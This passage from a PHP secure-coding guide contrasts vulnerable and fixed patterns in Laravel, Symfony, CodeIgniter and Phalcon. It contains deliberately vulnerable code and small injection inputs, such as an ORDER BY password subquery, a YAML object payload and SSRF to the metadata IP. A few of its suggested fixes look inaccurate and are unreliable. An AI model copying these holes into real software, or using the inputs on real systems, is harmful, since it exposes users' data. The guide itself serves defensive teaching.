        'verify_peer_name'  => true,
        'cafile'            => '/etc/ssl/certs/ca-certificates.crt',
    ]
]);
$content = file_get_contents($url, false, $context);
```

---

### unserialize() with Legacy Framework Gadget Chains

**Vulnerable pattern:**

```php
// Session data stored in a cookie or POST field, then unserialized
$session = unserialize(base64_decode($_COOKIE['sess']));

// Or in legacy CMS/framework code that serializes objects to the DB
$obj = unserialize($row['serialized_data']);
```

**Why it fails beyond the general case:**

Documented gadget chains exist for Symfony 2.x/3.x, Zend Framework 1.x/2.x, Yii 1.x, CakePHP 2.x, and many ORMs. An application that runs any of these as dependencies ÔÇö even if the application's own code never creates exploitable gadgets ÔÇö can be exploited if it unserializes user data anywhere. The PHP Generic Gadget Chains (PHPGGC) tool maintains a current list.

**If you cannot upgrade and cannot remove unserialize():**

```php
// Sign the serialized data with HMAC before storing it
// Verify the HMAC before unserializing
function serialize_signed(mixed $data, string $key): string {
    $serialized = serialize($data);
    $hmac = hash_hmac('sha256', $serialized, $key);
    return $hmac . ':' . base64_encode($serialized);
}

function unserialize_signed(string $input, string $key): mixed {
    [$hmac, $encoded] = explode(':', $input, 2);
    $serialized = base64_decode($encoded);
    $expected = hash_hmac('sha256', $serialized, $key);
    if (!hash_equals($expected, $hmac)) {
        throw new RuntimeException('Invalid signature ÔÇö possible tampering');
    }
    return unserialize($serialized);
}
```

> **Warning:** HMAC signing prevents attacker-crafted serialized payloads from being processed, but it does not protect against insider threats or key leakage. If the signing key is stored in the database or a leaked config file, the protection collapses.

---

## 3. Laravel

> **Applies to:** Projects containing `laravel/framework` in `composer.json`.
> **Quick detect:**
> ```bash
> php artisan --version
> # or:
> grep -i laravel composer.json
> ```
> **Not using Laravel?** Skip to [Symfony](#4-symfony) or [CodeIgniter](#5-codeigniter).

---

### Mass Assignment

**Vulnerable pattern:**

```php
// Controller ÔÇö fills model with all request input
User::create(request()->all());
$user->fill(request()->all());
$user->update(request()->all());

// POST request body: {"name":"Alice","email":"a@b.com","role":"admin"}
// If 'role' is not in $guarded or $fillable, user becomes admin
```

**Why it fails:**

Laravel's mass assignment protection requires either a `$fillable` array (allowlist) or `$guarded` array (denylist) on each model. A model with neither ÔÇö or with `$guarded = []` ÔÇö accepts all fields. The common "fix" of adding `$guarded = ['id']` only protects the primary key, leaving `role`, `is_admin`, `email_verified_at`, and any other sensitive fields unprotected.

**Fixed pattern:**

```php
// In the model: use $fillable, not $guarded, for user-facing models
class User extends Model {
    protected $fillable = ['name', 'email', 'password'];
    // 'role', 'is_admin', 'email_verified_at' are not listed ÔÇö cannot be mass assigned
}

// In the controller: use only() to explicitly select allowed fields
User::create(request()->only(['name', 'email', 'password']));

// For admin-only fields, set them explicitly after creation:
$user = User::create(request()->only(['name', 'email', 'password']));
if ($request->user()->isAdmin()) {
    $user->role = $request->input('role');
    $user->save();
}
```

---

### Raw SQL in Eloquent

**Vulnerable pattern:**

```php
// Using DB::select() with string interpolation
$users = DB::select("SELECT * FROM users WHERE id = $id");

// Using whereRaw() with direct interpolation
$users = User::whereRaw("status = '$status' AND city = '$city'")->get();

// Using raw() inside orderBy:
$users = User::orderByRaw($_GET['sort'])->get();
```

**Why it fails:**

The existence of Eloquent does not prevent SQL injection. `DB::select()`, `DB::statement()`, `whereRaw()`, `selectRaw()`, `orderByRaw()`, and `groupByRaw()` all accept raw SQL strings and pass them to the database without escaping if you use string interpolation instead of bindings.

**Fixed pattern:**

```php
// Always use parameter bindings with raw methods
$users = DB::select('SELECT * FROM users WHERE id = ?', [$id]);

$users = User::whereRaw('status = ? AND city = ?', [$status, $city])->get();

// For orderBy with user input: use an allowlist
$sortColumn = in_array($_GET['sort'], ['name', 'created_at', 'email'])
    ? $_GET['sort']
    : 'created_at';
$users = User::orderBy($sortColumn, 'asc')->get();
```

---

### Column Injection via orderBy

**Vulnerable pattern:**

```php
// Passing user input directly to orderBy()
$users = User::orderBy(request('sort'), request('direction'))->get();

// Generates: ORDER BY `injected_column` ASC
// SQL: ORDER BY (SELECT password FROM users WHERE id=1) ASC
// ÔÇö this is blind SQL injection via column expression
```

**Why it fails:**

Laravel's `orderBy()` quotes the column name with backticks on MySQL, but does not validate it against the actual table schema. An attacker can pass expressions like `(SELECT password FROM users LIMIT 1)` as the sort column. While backtick quoting limits some injection, complex expressions and subqueries can still be injected depending on the database driver.

**Fixed pattern:**

```php
$allowedSortColumns = ['name', 'email', 'created_at', 'updated_at'];
$sort = in_array(request('sort'), $allowedSortColumns) ? request('sort') : 'created_at';
$direction = request('direction') === 'desc' ? 'desc' : 'asc';
$users = User::orderBy($sort, $direction)->get();
```

---

### Unescaped Blade Output

**Vulnerable pattern:**

```blade
{{-- Unescaped output ÔÇö XSS if $comment contains <script> --}}
{!! $comment !!}
{!! $user->bio !!}
{!! nl2br($text) !!}
```

**Why it fails:**

`{!! !!}` in Blade explicitly disables HTML escaping. It is intended for rendering trusted HTML (e.g., from a Markdown parser you control). Using it with any user-supplied field ÔÇö even one that seems plain text ÔÇö is XSS. This is particularly common with WYSIWYG editor output, where developers assume the editor's own client-side sanitization is sufficient.

**Fixed pattern:**

```blade
{{-- Safe: HTML-escaped by default --}}
{{ $comment }}
{{ $user->bio }}

{{-- If you need to render HTML from user input, sanitize server-side first --}}
{!! clean($user->bio) !!}
{{-- using HTMLPurifier or similar library --}}
```

```php
// Composer: composer require ezyang/htmlpurifier
$purifier = new HTMLPurifier();
$safeHtml = $purifier->purify($userHtml);
```

---

### APP_DEBUG in Production

**Vulnerable pattern:**

```ini
# .env
APP_DEBUG=true
APP_ENV=production
```

**Why it fails:**

With `APP_DEBUG=true`, Laravel's exception handler renders full Whoops stack traces to the browser. These traces include: the full exception message and stack, the values of all variables in the call frame, a snippet of the source file, and ÔÇö critically ÔÇö the rendered `.env` file contents when the error occurs during bootstrap. A single 500 error exposes `DB_PASSWORD`, `MAIL_PASSWORD`, `AWS_SECRET_ACCESS_KEY`, and `APP_KEY` to any observer.

**Fixed pattern:**

```ini
# .env for production
APP_DEBUG=false
APP_ENV=production
```

```php
// In AppServiceProvider or bootstrap ÔÇö add a fallback check
if (config('app.debug') && app()->environment('production')) {
    throw new RuntimeException('APP_DEBUG must not be true in production');
}
```

---

### APP_KEY Leak

**Vulnerable pattern:**

```ini
# .env committed to version control, or leaked via APP_DEBUG error
APP_KEY=base64:abc123...
```

**Why it fails:**

`APP_KEY` is used to sign and encrypt Laravel's cookies, sessions, and encrypted model attributes. In Laravel 5.x and 6.x, the `remember_me` cookie was a serialized, encrypted object. If an attacker knows `APP_KEY`, they can forge valid cookies with arbitrary serialized content ÔÇö in those versions, this was a remote code execution path via PHP object injection. In newer Laravel, the immediate risk is cookie forgery and session hijacking rather than RCE.

**Fixed pattern:**

```bash
# Rotate APP_KEY if it was ever exposed:
php artisan key:generate

# This invalidates all sessions and encrypted cookies ÔÇö users will be logged out.
# Encrypted model fields (using Laravel's Encryptable cast) will also need re-encryption.
```

```bash
# Ensure .env is in .gitignore
grep '.env' .gitignore || echo '.env' >> .gitignore

# Search git history for leaked keys:
git log --all --full-history -p -- .env | grep APP_KEY
```

---

### Telescope and Horizon Without Auth

**Vulnerable pattern:**

```php
// app/Providers/TelescopeServiceProvider.php
protected function gate(): void
{
    Gate::define('viewTelescope', function ($user) {
        return true;  // everyone can view
    });
}

// Or: Horizon with no auth configured
// config/horizon.php: 'middleware' => ['web']  ÔÇö no auth check
```

**Why it fails:**

Laravel Telescope (debugging tool) and Horizon (queue dashboard) are accessible without authentication when deployed to production environments where the environment check returns true for all users. Telescope exposes every request, response, SQL query, queue job, cache operation, mail, and exception ÔÇö including the contents of request bodies containing passwords or tokens.

**Fixed pattern:**

```php
// TelescopeServiceProvider.php
protected function gate(): void
{
    Gate::define('viewTelescope', function ($user) {
        return in_array($user->email, [
            'admin@yourapp.example.com',
        ]);
    });
}

// config/telescope.php ÔÇö also limit which environments run Telescope
'enabled' => env('TELESCOPE_ENABLED', false),
```

```php
// config/horizon.php
'middleware' => ['web', 'auth', 'can:viewHorizon'],
```

---

### SSRF via Http::get()

**Vulnerable pattern:**

```php
// Fetching a user-provided URL with Laravel's HTTP client
$response = Http::get(request('url'));

// Or proxying requests:
$response = Http::withHeaders($request->headers->all())
    ->get('http://internal-service/' . $request->path());
```

**Why it fails:**

Laravel's `Http` facade wraps Guzzle and does not perform URL validation. A user-supplied URL can point to cloud metadata endpoints (`http://169.254.169.254/`), internal network services (`http://10.0.0.1/admin`), or local services (`http://localhost:6379` for Redis).

**Fixed pattern:**

```php
use Illuminate\Support\Facades\Http;

$url = request('url');
$parsed = parse_url($url);

// Validate scheme
if (!in_array($parsed['scheme'] ?? '', ['https', 'http'])) {
    abort(400, 'Invalid URL scheme');
}

// Resolve host and check for private/reserved ranges
$ip = gethostbyname($parsed['host'] ?? '');
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    abort(400, 'URL resolves to a private or reserved address');
}

$response = Http::timeout(10)->get($url);
```

---

### storage:link Misconfiguration

**Vulnerable pattern:**

```bash
# Creates a symlink: public/storage -> storage/app/public
php artisan storage:link
```

```php
// If files are stored outside storage/app/public,
// or if the symlink is created for the wrong path,
// all of storage/ may be accessible:
Storage::disk('local')->put('temp/private-report.pdf', $data);
// URL: https://yourapp.com/storage/../temp/private-report.pdf
// Depending on server traversal handling, may be accessible
```

**Why it fails:**

`storage:link` creates a symlink from `public/storage` to `storage/app/public`. If your application stores files using `Storage::disk('local')`, those files go to `storage/app/` ÔÇö not `storage/app/public/`. Misconfiguration can put private files in the public storage path, or a poorly configured web server may follow `..` traversal through the symlink into parent directories.

**Fixed pattern:**

```php
// Private files: always use the 'local' disk (not public)
Storage::disk('local')->put('reports/' . $filename, $content);

// Public files only: use the 'public' disk
Storage::disk('public')->put('avatars/' . $filename, $content);

// Generate download URLs for private files via a controller
return Storage::disk('local')->download('reports/' . $filename);
```

```nginx
# Nginx: prevent traversal through symlinks
location /storage/ {
    # Do not allow directory traversal
    if ($request_uri ~* "\.\.") { return 403; }
    try_files $uri =404;
}
```

---

### Queue Job Deserialization

**Vulnerable pattern:**

```php
// Job class that accepts user-controlled data
class ProcessUserData implements ShouldQueue {
    public function __construct(
        public mixed $userData  // attacker controls this if queue data is stored externally
    ) {}

    public function handle(): void {
        unserialize($this->userData);
    }
}
```

**Why it fails:**

Laravel queues serialize job objects to the queue backend (Redis, database, SQS). If an attacker can write to the queue backend directly (e.g., via an exposed Redis instance, or a misconfigured SQS policy), they can inject crafted job payloads that exploit PHP object injection when deserialized by the queue worker.

**Fixed pattern:**

```php
// Never store user-controlled, unvalidated data as serializable job properties
// Store IDs, not objects ÔÇö fetch the data in the handle() method
class ProcessUserData implements ShouldQueue {
    public function __construct(
        public int $userId,      // just the ID
        public string $action    // validated string
    ) {}

    public function handle(): void {
        $user = User::findOrFail($this->userId);
        // fetch and validate data from the DB, not from the job payload
    }
}
```

---

### Web Root Not Set to public/

**Vulnerable pattern:**

```
/var/www/app/
Ôö£ÔöÇÔöÇ app/
Ôö£ÔöÇÔöÇ config/
Ôö£ÔöÇÔöÇ .env          ÔåÉ accessible if web root is wrong
Ôö£ÔöÇÔöÇ composer.json
Ôö£ÔöÇÔöÇ public/       ÔåÉ this should be the web root
Ôöé   ÔööÔöÇÔöÇ index.php
ÔööÔöÇÔöÇ storage/
```

If the web server serves from `/var/www/app/` instead of `/var/www/app/public/`, then `https://yourapp.com/.env` returns the `.env` file directly.

**Why it fails:**

Laravel's `.env` file, `composer.json`, `composer.lock`, `artisan`, and `storage/logs/laravel.log` are all in the project root, not in `public/`. A web server misconfiguration that serves from the project root rather than `public/` exposes all of these. This is the most common way `.env` files are leaked.

**Fixed pattern:**

```nginx
server {
    root /var/www/app/public;  # not /var/www/app/
    index index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        fastcgi_pass php:9000;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
    }
}
```

---

### Signed URL Expiry Misuse

**Vulnerable pattern:**

```php
// Creating a "temporary" signed URL with a far-future expiry
$url = URL::temporarySignedRoute(
    'invoice.download',
    now()->addYears(100),  // effectively permanent
    ['invoice' => $invoice->id]
);

// Or emailing signed URLs without tracking whether the
// underlying resource has changed ownership
```

**Why it fails:**

A signed URL with a 100-year expiry is cryptographically identical to a permanent signed URL. If the URL is forwarded, leaked, or stored in a browser history, it remains valid until `APP_KEY` rotates. Signed URLs also do not check authorization independently ÔÇö they verify only that the URL was not tampered with, not that the requesting user still has permission to access the resource.

**Fixed pattern:**

```php
// Use short expiry and re-generate on demand
$url = URL::temporarySignedRoute(
    'invoice.download',
    now()->addMinutes(15),
    ['invoice' => $invoice->id]
);

// In the route handler: also check authorization independently
Route::get('/invoice/{invoice}/download', function (Invoice $invoice) {
    abort_unless(request()->hasValidSignature(), 403);
    abort_unless(auth()->user()->can('view', $invoice), 403);
    return Storage::download($invoice->file_path);
})->name('invoice.download');
```

---

### Laravel 5.x mcrypt Dependency

**Vulnerable pattern:**

```php
// Laravel 5.x used Crypt::encrypt/decrypt via mcrypt
// After upgrading to PHP 7.2+, mcrypt is removed
// Crypt::decrypt() silently returns false or throws an exception
// on data encrypted with the old implementation

$value = Crypt::decrypt($storedEncryptedValue);
// Returns false on PHP 7.2+ for data encrypted with Laravel 5.x
```

**Why it fails:** Same root cause as the [mcrypt section above](#mcrypt-removed-in-php-72). Laravel 5.x changed encryption implementations between versions, and data encrypted with the old mcrypt-based `Crypt` cannot be decrypted with the newer OpenSSL-based implementation without explicit migration.

**Fixed pattern:**

```bash
# Migrate encrypted data before upgrading PHP:
# 1. On PHP 7.1 (last version with mcrypt): export and re-encrypt all stored encrypted values
# 2. Use the openssl-based encryption from Laravel 5.4+ (which was already the default
#    in 5.4 when running on PHP without mcrypt)
# 3. Upgrade to PHP 7.2 after all stored values are re-encrypted
```

---

### Rate Limiting Not Default in Laravel 6.x and Below

**Vulnerable pattern:**

```php
// LoginController.php in Laravel < 8 ÔÇö no rate limiting applied
public function login(Request $request) {
    if (Auth::attempt($request->only('email', 'password'))) {
        return redirect()->intended('/');
    }
    return back()->withErrors(['email' => 'Invalid credentials']);
}
```

**Why it fails:**

Laravel 8 added the `throttle:login` middleware to authentication routes by default. Laravel 6.x and 7.x did not. The `AuthenticatesUsers` trait included a `hasTooManyLoginAttempts()` lockout, but only if you used the trait ÔÇö custom login controllers often dropped it.

**Fixed pattern:**

```php
// Add throttle middleware to auth routes in Laravel 6.x/7.x
Route::middleware(['throttle:5,1'])->group(function () {
    Route::post('/login', [LoginController::class, 'login']);
    Route::post('/password/email', [ForgotPasswordController::class, 'sendResetLinkEmail']);
});

// Or use the ThrottlesLogins trait in your controller:
use Illuminate\Foundation\Auth\ThrottlesLogins;

class LoginController extends Controller {
    use ThrottlesLogins;
    protected $maxAttempts = 5;
    protected $decayMinutes = 1;
}
```

---

### request()->merge() Feeding create()

**Vulnerable pattern:**

```php
// Adding server-derived data to the request bag, then passing all of it to create()
public function store(Request $request) {
    $request->merge(['created_by' => auth()->id()]);
    $article = Article::create($request->all());
    // request->all() now includes everything the user sent
    // PLUS created_by ÔÇö but also role=admin if attacker adds it
}
```

**Why it fails:**

`$request->merge()` adds to the request data bag, but does not restrict what was already there. Calling `$request->all()` after a merge returns the merged data plus the original user input. If the model's `$fillable` is not strictly defined, the user's extra fields go through.

**Fixed pattern:**

```php
public function store(Request $request) {
    $validated = $request->validate([
        'title'   => 'required|string|max:255',
        'content' => 'required|string',
    ]);

    $article = Article::create(array_merge($validated, [
        'created_by' => auth()->id(),
    ]));
}
```

---

## 4. Symfony

> **Applies to:** Projects containing `symfony/framework-bundle` in `composer.json`.
> **Quick detect:**
> ```bash
> php bin/console --version
> # or:
> grep symfony/framework-bundle composer.json
> ```
> **Not using Symfony?** Skip to [CodeIgniter](#5-codeigniter).

---

### Twig raw Filter

**Vulnerable pattern:**

```twig
{# Rendering user-provided content without escaping #}
{{ user.bio|raw }}
{{ comment.content|raw }}
{{ article.body|raw }}
```

**Why it fails:**

Twig escapes output by default. The `|raw` filter explicitly disables escaping for that variable. Any user-controlled value passed through `|raw` is XSS. This is especially common in article bodies, comments, and profile descriptions where developers want to allow basic HTML formatting.

**Fixed pattern:**

```twig
{# Default: safe, escaped #}
{{ user.bio }}

{# If HTML is needed: sanitize on the PHP side before passing to Twig #}
{{ sanitized_bio|raw }}
```

```php
// In the controller, sanitize before passing to template:
// composer require ezyang/htmlpurifier
$purifier = new \HTMLPurifier();
return $this->render('profile.html.twig', [
    'sanitized_bio' => $purifier->purify($user->getBio()),
]);
```

---

### Web Debug Toolbar in Production

**Vulnerable pattern:**

```yaml
# config/packages/dev/web_profiler.yaml ÔÇö sometimes misconfigured to run in prod
web_profiler:
    toolbar: true
    intercept_redirects: false

framework:
    profiler:
        enabled: true
        collect: true
```

**Why it fails:**

The Symfony Web Debug Toolbar and its associated `/_wdt` and `/_profiler` routes expose every HTTP request, Doctrine query (including query parameters), Twig template variables, PHP configuration, route list, security voter decisions, cache hits/misses, and mailer events. Accessing `/_profiler` on a production server with toolbar enabled gives an attacker a complete picture of the application's internals.

**Fixed pattern:**

```yaml
# config/packages/prod/web_profiler.yaml
web_profiler:
    toolbar: false
    intercept_redirects: false

framework:
    profiler:
        enabled: false
```

```bash
# Verify profiler routes are not accessible in production:
curl -I https://yourapp.example.com/_profiler/
# Should return 404, not 200
```

---

### Doctrine DQL Without Sanitization

**Vulnerable pattern:**

```php
// DQL injection via string interpolation
$id = $request->query->get('id');
$dql = "SELECT u FROM App\Entity\User u WHERE u.id = $id";
$query = $entityManager->createQuery($dql);

// JPQL/DQL injection: ?id=1 OR 1=1
// Result: returns all users
```

**Why it fails:**

Doctrine DQL is not SQL, but it has its own injection surface. String interpolation into DQL allows attackers to modify WHERE clauses, add OR conditions, and in some cases access related entities. DQL injection does not support the same tricks as SQL injection (no UNION, no stacked queries), but it can bypass authorization checks.

**Fixed pattern:**

```php
// Use named parameters ÔÇö always
$query = $entityManager->createQuery(
    'SELECT u FROM App\Entity\User u WHERE u.id = :id'
)->setParameter('id', $request->query->get('id'));

// For Repository methods: use QueryBuilder with parameters
$users = $userRepository->createQueryBuilder('u')
    ->where('u.status = :status')
    ->setParameter('status', $status)
    ->getQuery()
    ->getResult();
```

---

### YAML Object Deserialization

**Vulnerable pattern:**

```php
// Symfony < 3.4: parsing user-supplied YAML
use Symfony\Component\Yaml\Yaml;
$data = Yaml::parse($_POST['config_yaml']);

// With payload: !php/object:O:8:"stdClass":1:{s:3:"foo";s:3:"bar";}
// Instantiates PHP objects during YAML parsing
```

**Why it fails:**

Symfony's YAML component supported PHP object serialization (`!php/object`) in versions before 3.4, allowing deserialization of PHP objects from YAML content. This has the same gadget chain exploitation potential as `unserialize()`.

**Fixed pattern:**

```php
// Symfony 3.4+ and 4.x+: object support is disabled by default
// If using an older version, explicitly disable:
use Symfony\Component\Yaml\Yaml;

// Symfony 3.1+: pass flags to disable PHP object support
$data = Yaml::parse($yamlString, Yaml::DUMP_OBJECT_AS_MAP);

// Better: validate that input is not user-controlled;
// never parse user-supplied YAML as application configuration
```

---

### Firewall Ordering

**Vulnerable pattern:**

```yaml
# security.yaml
security:
    firewalls:
        main:
            pattern: ^/
            # ... auth config

        api:
            pattern: ^/api/
            stateless: true
            # ... token auth

# Routes outside any firewall pattern silently bypass all authentication
# /api/internal/reset matches ^/ but the 'api' firewall with ^/api/ may
# not apply if ordering places 'main' first
```

**Why it fails:**

Symfony evaluates firewalls in order and stops at the first match. A route that matches an early, permissive firewall (`^/`) will never reach a more restrictive later firewall (`^/api/secure/`). Routes that are outside all firewall patterns are processed without any security checks ÔÇö no session, no token verification, no access control evaluation.

**Fixed pattern:**

```yaml
security:
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false

        api:
            pattern: ^/api/
            stateless: true
            custom_authenticator: App\Security\ApiTokenAuthenticator

        main:
            lazy: true
            provider: app_user_provider
            # catches everything not matched above

    access_control:
        - { path: ^/api/public, roles: PUBLIC_ACCESS }
        - { path: ^/api/, roles: ROLE_API_USER }
        - { path: ^/admin, roles: ROLE_ADMIN }
```

---

### access_control Case Sensitivity

**Vulnerable pattern:**

```yaml
# security.yaml
security:
    access_control:
        - { path: ^/admin, roles: ROLE_ADMIN }
```

**Why it fails:**

Symfony's `access_control` path matching is case-sensitive by default. The pattern `^/admin` protects `/admin/dashboard` but does NOT protect `/Admin/dashboard` or `/ADMIN/dashboard`. On case-insensitive file systems (macOS, Windows), the route may still resolve. Combined with Nginx routing that passes the original URL casing to Symfony, an attacker may access `/Admin/` without hitting the access control rule.

**Fixed pattern:**

```yaml
security:
    access_control:
        # Option 1: add a case-insensitive flag
        - { path: ^/admin, roles: ROLE_ADMIN, methods: [] }

        # Option 2: normalize URL casing in Symfony event listener
        # or in Nginx before proxying to PHP
```

```php
// EventListener to normalize URL case:
use Symfony\Component\HttpKernel\Event\RequestEvent;

class LowercaseUrlListener {
    public function onKernelRequest(RequestEvent $event): void {
        $request = $event->getRequest();
        $path = $request->getPathInfo();
        if ($path !== strtolower($path)) {
            // redirect to lowercase URL
            $event->setResponse(new RedirectResponse(strtolower($path)));
        }
    }
}
```

---

### Security Component Without Bundle

**Vulnerable pattern:**

```bash
# Installing the security component without the bundle
composer require symfony/security

# Not installing:
# composer require symfony/security-bundle
```

**Why it fails:**

`symfony/security` provides the security classes but does not wire them into the Symfony DI container or HTTP kernel. Without `symfony/security-bundle`, firewalls, access control, and authenticators are not automatically applied to the request lifecycle. Code that checks `$this->isGranted()` or `$this->denyAccessUnlessGranted()` may appear to work (no errors) but silently allows all access because the security layer is never invoked.

**Fixed pattern:**

```bash
composer require symfony/security-bundle
```

```yaml
# Verify in config/bundles.php that the bundle is registered:
# Symfony\Bundle\SecurityBundle\SecurityBundle::class => ['all' => true],
```

---

## 5. CodeIgniter

> **Applies to:** Projects using CodeIgniter 2, 3, or 4.
> **Quick detect:**
> ```bash
> # CI 2/3:
> head -5 system/CodeIgniter.php
> # CI 4:
> grep codeigniter4/framework composer.json
> ```
> **Not using CodeIgniter?** Skip to [Phalcon](#6-phalcon) or [Pure PHP](#7-pure-php-no-framework).

---

### CSRF Off by Default in CI 2.x

**Vulnerable pattern:**

```php
// application/config/config.php ÔÇö CodeIgniter 2.x defaults
$config['csrf_protection'] = FALSE;  // This is the default
```

**Why it fails:**

CodeIgniter 2.x ships with CSRF protection disabled. Any POST form in a CI 2.x application is CSRF-vulnerable unless `csrf_protection` was explicitly enabled. This is a common finding in CI 2.x security audits because the feature exists but is off by default, and developers often do not enable it.

**Fixed pattern:**

```php
// application/config/config.php
$config['csrf_protection'] = TRUE;
$config['csrf_token_name'] = 'csrf_token';
$config['csrf_cookie_name'] = 'csrf_cookie';
$config['csrf_expire'] = 7200;
$config['csrf_regenerate'] = TRUE;  // regenerate token after each POST
$config['csrf_exclude_uris'] = ['api/webhook'];  // explicitly exclude only what needs it
```

---

### Raw Query Strings in CI 2.x/3.x

**Vulnerable pattern:**

```php
// Passing user input directly to query()
$this->db->query("SELECT * FROM users WHERE name = '" . $this->input->post('name') . "'");
```

**Why it fails:**

`$this->db->query()` accepts a raw SQL string. Even with CI's active record (now called Query Builder in CI 3+), developers who drop to raw `query()` must handle escaping themselves. `$this->input->post()` performs XSS filtering (when `$config['global_xss_filtering']` is on) but does NOT prevent SQL injection.

**Fixed pattern:**

```php
// Option 1: use query binding
$this->db->query(
    'SELECT * FROM users WHERE name = ?',
    [$this->input->post('name')]
);

// Option 2: use Query Builder (CI 3.x)
$this->db->where('name', $this->input->post('name'));
$query = $this->db->get('users');
```

---

### Column Injection in CI 3.x Active Record

**Vulnerable pattern:**

```php
// User input as the column name in where()
$column = $this->input->get('filter_by');
$value  = $this->input->get('filter_value');
$this->db->where($column, $value);
$query = $this->db->get('users');
```

**Why it fails:**

CI's `where($key, $value)` escapes the `$value` but not the `$key` (column name). An attacker who controls the column name can inject: `WHERE (SELECT password FROM users LIMIT 1) = 'known_hash'` ÔÇö a blind comparison that reveals data through true/false responses.

**Fixed pattern:**

```php
$allowedColumns = ['status', 'city', 'created_date'];
$column = $this->input->get('filter_by');

if (!in_array($column, $allowedColumns, true)) {
    $column = 'status';  // default safe column
}

$this->db->where($column, $this->input->get('filter_value'));
```

---

### Upload Class Extension-Only Check

**Vulnerable pattern:**

```php
// CI Upload class configuration
$config['allowed_types'] = 'jpg|png|gif';
// This checks only the file extension, not the actual file content
$this->upload->initialize($config);
$this->upload->do_upload('userfile');
```

**Why it fails:**

CodeIgniter's Upload library checks the file extension against `allowed_types` and checks the HTTP-supplied MIME type (`$_FILES['userfile']['type']`) ÔÇö but both of these are attacker-controlled. A PHP file with a `.jpg` extension and a manually-set MIME type of `image/jpeg` passes both checks.

**Fixed pattern:**

```php
// After CI's upload, verify actual content with fileinfo:
$uploadData = $this->upload->data();
$finfo = new finfo(FILEINFO_MIME_TYPE);
$actualMime = $finfo->file($uploadData['full_path']);

$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($actualMime, $allowedMimes, true)) {
    unlink($uploadData['full_path']);
    show_error('Invalid file content type');
}

// Also: rename the file to remove any executable extension
$ext = pathinfo($uploadData['orig_name'], PATHINFO_EXTENSION);
rename($uploadData['full_path'], $uploadData['file_path'] . bin2hex(random_bytes(8)) . '.' . $ext);
```

---

### xss_clean Deprecation in CI 4

**Vulnerable pattern:**

```php
// CI 3.x pattern, broken in CI 4:
$name = $this->input->post('name', TRUE);  // TRUE = run xss_clean

// Or in CI 4 attempting the same:
$name = $this->request->getPost('name', FILTER_SANITIZE_STRING);
// FILTER_SANITIZE_STRING was deprecated in PHP 8.1 and removed in PHP 8.2
```

**Why it fails:**

In CI 3.x, `$this->input->post('name', TRUE)` ran the `xss_clean()` function on the input, which was a regex-based sanitizer with known bypasses. In CI 4.x, `xss_clean` is no longer available as an automatic filter. Code migrated from CI 3 to CI 4 that relied on `xss_clean` for XSS protection silently provides no protection. Additionally, `FILTER_SANITIZE_STRING` was deprecated in PHP 8.1 and removed in 8.2.

**Fixed pattern:**

```php
// CI 4: validate and sanitize explicitly
$validation = \Config\Services::validation();
$validation->setRules([
    'name' => 'required|max_length[100]|alpha_numeric_space',
]);

if (!$validation->withRequest($this->request)->run()) {
    return $this->response->setStatusCode(422)->setBody($validation->getErrors());
}

$name = $this->request->getPost('name');
// Output escaping at the template layer ÔÇö not at input time
echo esc($name);  // CI 4's esc() helper ÔÇö context-aware escaping
```

---

### Encryption Key Exposure in CI 2.x

**Vulnerable pattern:**

```php
// application/config/config.php committed to version control
$config['encryption_key'] = 'mysecretkey12345';
```

**Why it fails:**

CodeIgniter 2.x uses `$config['encryption_key']` for `$this->encrypt->encode()` and for cookie encryption. If this key is in a file committed to version control, or if the `application/config/` directory is web-accessible, all encrypted cookies can be decrypted and forged.

**Fixed pattern:**

```php
// Load from environment variable, not config file
$config['encryption_key'] = getenv('CI_ENCRYPTION_KEY');

// Ensure application/config/ is not web-accessible
// In .htaccess or Nginx: deny access to application/ directory
```

```nginx
# Nginx
location ^~ /application/ {
    deny all;
    return 404;
}
```

---

### CI 3.x Patterns That Break Silently in CI 4

**What changes and why it matters:**

```php
// CI 3: $this->input->post()
// CI 4: $this->request->getPost()
// ÔÇö If old code is copied to CI 4, $this->input is still accessible
//   via a compatibility layer but $this->input->post('name', TRUE)
//   silently drops the XSS filter (TRUE is ignored)

// CI 3: $this->session->set_userdata()
// CI 4: $this->session->set() or session()->set()
// ÔÇö Old CI 3 code using set_userdata() may fail silently or use
//   a compatibility shim that does not apply CI 4's session driver

// CI 3: form_validation with callbacks
$this->form_validation->set_rules('email', 'Email', 'callback_check_email');
// CI 4: callbacks are still supported but the method must be on the controller
// ÔÇö If CI 4 resolves the callback differently, validation may silently pass

// CI 3: 'global_xss_filtering' in config
$config['global_xss_filtering'] = TRUE;
// CI 4: this config key is IGNORED ÔÇö it no longer exists
// ÔÇö Upgrading to CI 4 with this config set gives a false sense of security
```

**Fixed pattern:** Audit every input access point during CI 3 ÔåÆ CI 4 migration. Do not assume any CI 3 security control carries over automatically.

---

### allowed_hosts Not Configured in CI 4

**Vulnerable pattern:**

```php
// application/Config/App.php in CI 4
public $allowedHostnames = [];  // empty = accept any Host header
```

**Why it fails:**

Same root cause as the [Host Header Injection section above](#host-header-injection). CI 4's `allowedHostnames` (empty by default) means `base_url()` and any URL generated from it will reflect whatever `Host:` header the attacker sends. Password reset links, redirect URLs, and any code using `site_url()` or `base_url()` are affected.

**Fixed pattern:**

```php
// application/Config/App.php
public $allowedHostnames = ['yourapp.example.com', 'www.yourapp.example.com'];
public $baseURL = 'https://yourapp.example.com/';
```

---

## 6. Phalcon

> **Applies to:** Applications using the Phalcon PHP extension.
> **Quick detect:**
> ```bash
> php -m | grep phalcon
> grep -r 'Phalcon\\Mvc\\Application' .
> ```
> **Not using Phalcon?** Skip to [Pure PHP](#7-pure-php-no-framework).

---

### Volt raw Blocks

**Vulnerable pattern:**

```volt
{# Volt template ÔÇö raw block bypasses autoescaping #}
{%- raw -%}
{{ user.comment }}
{%- endraw -%}

{# Or explicit disable: #}
{% autoescape false %}
    {{ user.comment }}
{% endautoescape %}
```

**Why it fails:**

Volt autoescapes output by default. `{%- raw -%}` blocks and `{% autoescape false %}` disable this. Content inside these blocks is output verbatim, causing XSS if any user-controlled variable is rendered there.

**Fixed pattern:**

```volt
{# Use default autoescape ÔÇö Volt escapes {{ variable }} automatically #}
{{ user.comment }}

{# If you need raw HTML from a trusted source: sanitize in PHP before passing to template #}
{{ sanitized_comment }}
